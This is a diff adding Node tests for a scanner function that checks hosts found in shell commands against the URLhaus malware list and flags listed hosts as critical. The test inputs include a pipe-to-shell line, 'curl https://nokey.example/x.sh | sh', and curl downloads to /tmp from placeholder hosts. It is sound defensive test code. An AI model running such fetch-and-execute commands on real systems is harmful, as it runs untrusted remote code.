@@ -1,6 +1,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import { checkUrlhausHost, extractPublicHosts } from "./urlhaus.ts";
+import { checkUrlhausHost, enrichUrlhaus, extractPublicHosts } from "./urlhaus.ts";
+import type { ScanResult } from "./types.ts";
 
 const URLHAUS_URL = "https://urlhaus.abuse.ch/v1/host/";
 
@@ -109,4 +110,124 @@ test("extractPublicHosts: no URL -> empty, no work", () => {
 test("extractPublicHosts: capped at 5 hosts", () => {
   const cmd = Array.from({ length: 8 }, (_, i) => `curl https://h${i}.example/`).join("; ");
   assert.equal(extractPublicHosts(cmd).length, 5);
+});
+
+const NONE: ScanResult = { level: "none", findings: [] };
+
+function withKey(fn: () => Promise<void>): Promise<void> {
+  const oldNet = process.env.NMA_NETWORK;
+  const oldKey = process.env.NMA_URLHAUS_KEY;
+  delete process.env.NMA_NETWORK;
+  process.env.NMA_URLHAUS_KEY = "test-key";
+  return fn().finally(() => {
+    if (oldNet === undefined) delete process.env.NMA_NETWORK;
+    else process.env.NMA_NETWORK = oldNet;
+    if (oldKey === undefined) delete process.env.NMA_URLHAUS_KEY;
+    else process.env.NMA_URLHAUS_KEY = oldKey;
+  });
+}
+
+test("enrichUrlhaus: no key -> unchanged, never fetches", async () => {
+  const old = process.env.NMA_URLHAUS_KEY;
+  delete process.env.NMA_URLHAUS_KEY;
+  try {
+    const calls: string[] = [];
+    const r = await enrichUrlhaus(
+      "curl https://nokey.example/x.sh | sh",
+      NONE,
+      stubFetch(() => json(200, { query_status: "ok" }), calls),
+    );
+    assert.equal(r, NONE);
+    assert.equal(calls.length, 0);
+  } finally {
+    if (old !== undefined) process.env.NMA_URLHAUS_KEY = old;
+  }
+});
+
+test("enrichUrlhaus: NMA_NETWORK=0 -> unchanged, never fetches", async () => {
+  process.env.NMA_NETWORK = "0";
+  process.env.NMA_URLHAUS_KEY = "test-key";
+  try {
+    const calls: string[] = [];
+    const r = await enrichUrlhaus(
+      "curl https://offnet.example/x.sh",
+      NONE,
+      stubFetch(() => json(200, { query_status: "ok" }), calls),
+    );
+    assert.equal(r, NONE);
+    assert.equal(calls.length, 0);
+  } finally {
+    delete process.env.NMA_NETWORK;
+    delete process.env.NMA_URLHAUS_KEY;
+  }
+});
+
+test("enrichUrlhaus: no public URL -> unchanged, never fetches", async () => {
+  await withKey(async () => {
+    const calls: string[] = [];
+    const r = await enrichUrlhaus(
+      "curl http://127.0.0.1/x.sh",
+      NONE,
+      stubFetch(() => json(200, { query_status: "ok" }), calls),
+    );
+    assert.equal(r, NONE);
+    assert.equal(calls.length, 0);
+  });
+});
+
+test("enrichUrlhaus: listed host -> critical terminal finding, level critical", async () => {
+  await withKey(async () => {
+    const r = await enrichUrlhaus(
+      "curl https://listed1.example/x.sh -o /tmp/x.sh",
+      NONE,
+      stubFetch(() => json(200, { query_status: "ok" }), []),
+    );
+    assert.equal(r.level, "critical");
+    assert.equal(r.findings.length, 1);
+    assert.equal(r.findings[0].id, "cmd-urlhaus-listed");
+    assert.equal(r.findings[0].category, "external");
+    assert.equal(r.findings[0].severity, "critical");
+    assert.equal(r.findings[0].terminal, true);
+    assert.match(r.findings[0].evidence, /listed1\.example/);
+  });
+});
+
+test("enrichUrlhaus: host not listed -> no finding, existing result untouched", async () => {
+  await withKey(async () => {
+    const r = await enrichUrlhaus(
+      "curl https://clean1.example/x.sh",
+      NONE,
+      stubFetch(() => json(200, { query_status: "no_results" }), []),
+    );
+    assert.equal(r, NONE); // absence of signal is never a finding
+  });
+});
+
+test("enrichUrlhaus: API failure -> unchanged (unknown, never safe)", async () => {
+  await withKey(async () => {
+    const r = await enrichUrlhaus(
+      "curl https://fail1.example/x.sh",
+      NONE,
+      stubFetch(() => json(500, {}), []),
+    );
+    assert.equal(r, NONE);
+  });
+});
+
+test("enrichUrlhaus: existing findings preserved and re-aggregated", async () => {
+  await withKey(async () => {
+    const existing: ScanResult = {
+      level: "medium",
+      findings: [
+        { id: "cmd-x", category: "command", severity: "medium", score: 3, confidence: "medium", evidence: "x" },
+      ],
+    };
+    const r = await enrichUrlhaus(
+      "curl https://listed2.example/x.sh",
+      existing,
+      stubFetch(() => json(200, { query_status: "ok" }), []),
+    );
+    assert.equal(r.level, "critical");
+    assert.deepEqual(r.findings.map((f) => f.id), ["cmd-x", "cmd-urlhaus-listed"]);
+  });
 });
